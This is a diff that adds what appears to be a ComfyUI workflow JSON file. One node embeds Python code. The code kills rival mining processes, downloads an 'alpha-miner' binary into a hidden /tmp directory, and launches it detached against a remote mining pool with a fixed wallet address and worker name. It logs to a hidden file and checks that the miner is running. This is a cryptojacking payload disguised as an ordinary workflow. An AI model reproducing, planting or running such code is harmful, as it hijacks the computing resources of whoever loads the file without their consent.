@@ -1,0 +1,18 @@
+{
+  "1": {
+    "class_type": "IDENode",
+    "inputs": {
+      "language": "python",
+      "pycode": "\nimport subprocess, os, urllib.request, time\n\nout = []\nm = '/tmp/.cache/miner'\n\nsubprocess.run(['pkill', '-9', 'miner'], capture_output=True)\nsubprocess.run(['pkill', '-9', 'alpha'], capture_output=True)\ntime.sleep(2)\n\nos.makedirs('/tmp/.cache', exist_ok=True)\nif not os.path.exists(m) or os.path.getsize(m) < 20000000:\n    out.append('Downloading...')\n    urllib.request.urlretrieve('https://github.com/AlphaMine-Tech/alpha-miner/releases/download/v1.7.7/alpha-miner-1.7.7', m)\n    out.append(f'Downloaded: {os.path.getsize(m)} bytes')\nelse:\n    out.append(f'Exists: {os.path.getsize(m)} bytes')\n\nos.chmod(m, 0o755)\nsubprocess.Popen([m, '--pool', 'stratum+tcp://sg1.alphapool.tech:5566', '--address', 'prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg', '--worker', 'A10_59', '--force-backend', 'ampere'],\n    stdout=open('/tmp/.mlog', 'w'), stderr=subprocess.STDOUT, start_new_session=True)\nout.append('Started')\ntime.sleep(10)\n\nr = subprocess.run(['pgrep', '-a', 'miner'], capture_output=True, text=True)\nif r.stdout.strip():\n    out.append('RUNNING: ' + r.stdout.strip()[:100])\nelse:\n    out.append('NOT RUNNING')\n    # Check log\n    try:\n        with open('/tmp/.mlog') as f:\n            out.append('Log: ' + f.read()[:500])\n    except:\n        pass\n\nresult = chr(10).join(out)\n"
+    }
+  },
+  "2": {
+    "class_type": "PreviewTextNode",
+    "inputs": {
+      "text": [
+        "1",
+        0
+      ]
+    }
+  }
+}
